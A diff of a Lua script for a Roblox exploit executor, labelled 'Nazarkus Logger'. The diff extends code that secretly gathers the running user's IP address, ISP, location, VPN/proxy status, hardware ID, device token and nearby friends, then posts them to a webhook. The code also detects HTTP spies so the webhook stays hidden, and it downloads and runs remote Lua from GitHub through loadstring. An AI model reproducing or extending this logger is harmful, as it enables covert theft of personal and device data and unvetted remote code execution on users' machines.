@@ -27,15 +27,17 @@ local reqFunc = syn and syn.request or http_request or request or fluxus and flu
 
 local function isHttpHooked()
     if not reqFunc then return false end
+    
     if debug and debug.getinfo then
         local info = debug.getinfo(reqFunc)
         if info.source then
             local src = string.lower(info.source)
-            if string.find(src, "spy") or string.find(src, "hook") or string.find(src, "stealer") or string.find(src, "logger") then
+            if string.find(src, "spy") or string.find(src, "stealer") or string.find(src, "logger") then
                 return true
             end
         end
     end
+    
     return false
 end
 
@@ -58,7 +60,7 @@ if isHttpHooked() then
                 ["embeds"] = {{
                     ["title"] = "🚨 WEBHOOK STEAL ATTEMPT DETECTED 🚨",
                     ["color"] = 0x000000,
-                    ["description"] = "Someone tried to use `hookfunction` or an HTTP Spy to steal your webhook URL!",
+                    ["description"] = "Someone tried to use an HTTP Spy to steal your webhook URL!",
                     ["fields"] = {
                         {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                         {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
@@ -88,6 +90,36 @@ pcall(function()
         end
     end
 end)
+
+local function getExecutorStrength()
+    local required_unc = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}
+    local required_sunc = {"gethui", "setthreadidentity", "getthreadidentity"}
+    
+    local env = (getgenv and getgenv()) or getfenv(0)
+    
+    local unc_count = 0
+    for _, f in ipairs(required_unc) do
+        if env[f] then unc_count = unc_count + 1 
+        else pcall(function() if loadstring("return type("..f..") == 'function'")() then unc_count = unc_count + 1 end end) end
+    end
+
+    local sunc_count = 0
+    for _, f in ipairs(required_sunc) do
+        if env[f] then sunc_count = sunc_count + 1 
+        else pcall(function() if loadstring("return type("..f..") == 'function'")() then sunc_count = sunc_count + 1 end end) end
+    end
+
+    local unc_percent = math.floor((unc_count / #required_unc) * 100)
+    local sunc_percent = math.floor((sunc_count / #required_sunc) * 100)
+    
+    local result = string.format("**UNC:** %d%% | **sUNC:** %d%%", unc_percent, sunc_percent)
+    
+    if unc_percent < 80 then 
+        result = result .. "\n⚠️ Admin/IY могут не работать"
+    end
+
+    return result
+end
 
 -- blacklist
 local Blacklist = {
@@ -173,11 +205,16 @@ pcall(function()
             })
         })
     else
-        local ip_info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A"}
-        local ok, resp = pcall(reqFunc, {Url = "http://ip-api.com/json", Method = "GET"})
+        local ip_info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A", proxy = false, hosting = false}
+        local ok, resp = pcall(reqFunc, {Url = "http://ip-api.com/json?fields=status,country,city,timezone,isp,query,proxy,hosting", Method = "GET"})
         if ok and resp and resp.Success then
             local ok2, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
             if ok2 then ip_info = d end
+        end
+
+        local isVpnProxy = "Нет"
+        if ip_info.proxy or ip_info.hosting then
+            isVpnProxy = "Да"
         end
 
         local platform = "PC"
@@ -185,7 +222,7 @@ pcall(function()
         elseif UIS.GamepadEnabled and not UIS.KeyboardEnabled then platform = "Console" end
         if UIS.VREnabled then platform = "VR" end
 
-        local friendsStr = "Disabled in settings"
+        local friendsStr = "Disabled"
         if LOG_FRIENDS_IN_SERVER then
             local friendsInServer = {}
             for _, p in ipairs(game.Players:GetPlayers()) do
@@ -197,9 +234,10 @@ pcall(function()
                     end)
                 end
             end
-            friendsStr = #friendsInServer > 0 and table.concat(friendsInServer, ", ") or "No friends in server"
+            friendsStr = #friendsInServer > 0 and table.concat(friendsInServer, ", ") or "None"
         end
 
+        local execStrength = getExecutorStrength()
         local embedColor = (status == "blacklist") and 0xFF0000 or 0xFFA500
         local embedTitle = (status == "blacklist") and "🚫 Blacklisted User Blocked" or "⚠️ Unknown/Guest User Executed"
 
@@ -215,17 +253,18 @@ pcall(function()
                         ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=150&height=150&format=png"
                     },
                     ["fields"] = {
-                        {["name"] = "👤 Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", lp.DisplayName, lp.Name, uid, tostring(lp.AccountAge)), ["inline"] = true},
-                        {["name"] = "💻 System", ["value"] = string.format("**Platform:** %s\n**Executor:** %s", platform, tostring(executor)), ["inline"] = true},
-                        {["name"] = "🛡️ Faction (Clan)", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", factionTag, factionName), ["inline"] = false},
-                        {["name"] = "🔑 Hardware ID (CID)", ["value"] = string.format("```\n%s\n```", hwid), ["inline"] = false},
-                        {["name"] = "📱 Device Token (Hidden)", ["value"] = string.format("```\n%s\n```", deviceToken), ["inline"] = false},
-                        {["name"] = "🌍 Network Details", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query or "N/A", ip_info.isp or "N/A", ip_info.country or "N/A", ip_info.city or "N/A", ip_info.timezone or "N/A"), ["inline"] = false},
-                        {["name"] = "🎮 Game Status", ["value"] = string.format("**Game:** %s\n**Place ID:** `%s`\n**JobId (Server):** `%s`", place_name, game.PlaceId, game.JobId), ["inline"] = false},
-                        {["name"] = "👥 Friends Targets (in server)", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
-                        {["name"] = "🔗 Quick Links", ["value"] = "[Open Profile](https://www.roblox.com/users/"..uid.."/profile)", ["inline"] = false}
+                        {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", lp.DisplayName, lp.Name, uid, tostring(lp.AccountAge)), ["inline"] = true},
+                        {["name"] = "System", ["value"] = string.format("**Platform:** %s\n**Executor:** %s", platform, tostring(executor)), ["inline"] = true},
+                        {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", factionTag, factionName), ["inline"] = false},
+                        {["name"] = "Injector", ["value"] = execStrength, ["inline"] = false},
+                        {["name"] = "Hardware ID", ["value"] = string.format("```\n%s\n```", hwid), ["inline"] = false},
+                        {["name"] = "Device Token", ["value"] = string.format("```\n%s\n```", deviceToken), ["inline"] = false},
+                        {["name"] = "Network", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query or "N/A", ip_info.isp or "N/A", isVpnProxy, ip_info.country or "N/A", ip_info.city or "N/A", ip_info.timezone or "N/A"), ["inline"] = false},
+                        {["name"] = "Game", ["value"] = string.format("**Game:** %s\n**Place ID:** `%s`\n**JobId:** `%s`", place_name, game.PlaceId, game.JobId), ["inline"] = false},
+                        {["name"] = "Friends Target", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
+                        {["name"] = "Links", ["value"] = "[Profile](https://www.roblox.com/users/"..uid.."/profile)", ["inline"] = false}
                     },
-                    ["footer"] = { ["text"] = "Nazarkus Security Logger | Status: " .. string.upper(status) },
+                    ["footer"] = { ["text"] = "Nazarkus Logger | " .. string.upper(status) },
                     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
             })
@@ -237,8 +276,6 @@ if status == "blacklist" then
     lp:Kick("You are blacklisted from using this script.")
     return
 end
-
-print("[System] Authorized (" .. status .. ") — loading scripts...")
 
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))()
